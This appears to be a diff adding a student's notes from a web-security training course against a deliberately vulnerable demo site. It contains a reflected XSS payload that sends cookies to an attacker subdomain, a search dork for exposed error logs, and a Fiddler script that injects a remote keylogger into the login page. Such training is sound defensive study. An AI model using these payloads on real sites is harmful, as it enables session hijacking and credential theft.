@@ -1,0 +1,52 @@
+
+//injection via search example
+search term 'enzo/>'
+
+page source code key example lines""
+<h2>You searched for &quot;<span id="searchTerm">enzo&#47;</span>&quot;</h2>
+$('#searchTerm').val('enzo/>');
+
+
+$('#searchTerm').val('
+'); location.href='http://attacker.hackyourselffirst.troyhunt.com/Cookies/?c='%2BencodeURIComponent(document.cookie);//
+
+');
+----
+http://hackyourselffirst.troyhunt.com/Search?searchTerm=enzo%2F%3E
+
+
+http://hackyourselffirst.troyhunt.com/Search?searchTerm='); location.href='http://attacker.hackyourselffirst.troyhunt.com/Cookies/?c='%2BencodeURIComponent(document.cookie);//
+  
+----
+
+
+http://attacker.hackyourselffirst.troyhunt.com/
+http://hackyourselffirst.troyhunt.com/
+------
+
+inurl:elmah.axd "error log for"
+
+-------
+always encode output
+<script>alert(document.cookies)</script>
+
+cookie httpsflag
+
+----
+-- in fiddler script editor -- is an add on in Fiddler 4; injector21 is built into fiddler 4
+
+if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com/") && oSession.PathAndQuery=="/Account/Login"){
+
+//remove any compression or chunking
+oSession.utilDecodeResponse();
+
+var oBody = System.Text.Encoding.UTF8.GetSTring(oSession.responseBodyBytes);
+
+
+// Inject the key logger into the page
+oBody = oBody.replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http:/attacker.hackyourselffirst.troyhunt.com/KeyLogger/?k=;</script></body>" );
+
+
+//Set the response body to the changed body string
+oSession.utilSetResponseBody(oBody);
+}
